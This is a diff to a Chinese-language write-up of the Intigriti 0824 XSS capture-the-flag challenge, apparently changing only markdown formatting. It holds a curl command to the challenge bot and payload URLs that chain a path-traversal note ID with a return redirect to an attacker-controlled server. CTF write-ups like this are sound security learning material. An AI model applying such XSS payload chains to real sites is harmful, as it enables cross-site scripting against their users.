@@ -235,11 +235,12 @@ RUN npm install --registry=https://registry.npmmirror.com
 
 注册好账户之后，创建note，report，日志里面看不到啥，一直说超时。修改docker-compose.yml文件，将bot的8000端口也暴露出来。
 我们直接调用bot的端口。
-```curl -X POST -H 'content-type:application/json' -d '{"url":"http://127.0.0.1/view?note=..%5c..%5c..%5ccontact?return=http://127.0.0.1%2fa?8870d42b-1ead-481f-ac7e-9a22751d10ed"}' http://127.0.0.1:8000/visit
+```bash
+curl -X POST -H 'content-type:application/json' -d '{"url":"http://127.0.0.1/view?note=..%5c..%5c..%5ccontact?return=http://127.0.0.1%2fa?8870d42b-1ead-481f-ac7e-9a22751d10ed"}' http://127.0.0.1:8000/visit
 ```
 发现有请求。
 尝试着将ip换为域名，但是远程没有收到请求，可能是域名解析的问题。
-http://127.0.0.1/view?note=..\..\..\contact?return=https://[your_server]/json?72e02048-52e5-4fb2-b8e0-c59866231c94
+`http://127.0.0.1/view?note=..\..\..\contact?return=https://[your_server]/json?72e02048-52e5-4fb2-b8e0-c59866231c94`
 我们直接访问xss链接，发现服务端收到请求了，所以xss是存在的。
 
 远程服务端构造的xss代码
@@ -255,7 +256,7 @@ return new Response(JSON.stringify(payload),{headers: {
 
 ## 线上解题
 我们去线上网站上操作一下，注册，create note，访问note，构造payload url
-https://challenge-0824.intigriti.io/view?note=..\..\..\contact?return=https://[your_server]/json?72e02048-52e5-4fb2-b8e0-c59866231c94
+`https://challenge-0824.intigriti.io/view?note=..\..\..\contact?return=https://[your_server]/json?72e02048-52e5-4fb2-b8e0-c59866231c94`
 
 report这个url。
 查看服务端，发现没有，payload不对？
